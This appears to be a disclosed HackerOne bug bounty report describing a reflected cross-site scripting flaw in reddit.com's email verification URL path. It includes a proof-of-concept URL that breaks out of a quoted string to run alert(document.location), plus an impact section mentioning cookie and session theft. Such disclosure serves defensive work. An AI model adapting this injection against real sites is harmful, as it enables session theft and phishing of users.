# XSS Reflected on reddit.com via url path

## Report Details
- **Report ID**: 1051373
- **URL**: https://hackerone.com/reports/1051373
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-12-05T21:47:05.097Z
- **Disclosed**: 2022-09-27T16:04:21.641Z

## Reporter
- **Username**: criptex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
Hi I found a XSS-R

To reproduce the issue please click the poc link and then press the "verify email" button

PoC:

https://www.reddit.com/verification/asd',%20alert(document.location),%20%27

## Impact

With the help of XSS an attacker can steal your cookies, in many cases steal sessions, download malware onto your system and send a custom request.
Users can be socially engineered by the attacker by redirecting them from the real website to a fake one and there are many more attack scenarios that an expert attacker can perform with XSS.
It is also possible to inject html thus modifying the original page

## Attachments
- PoC-Reddit.png
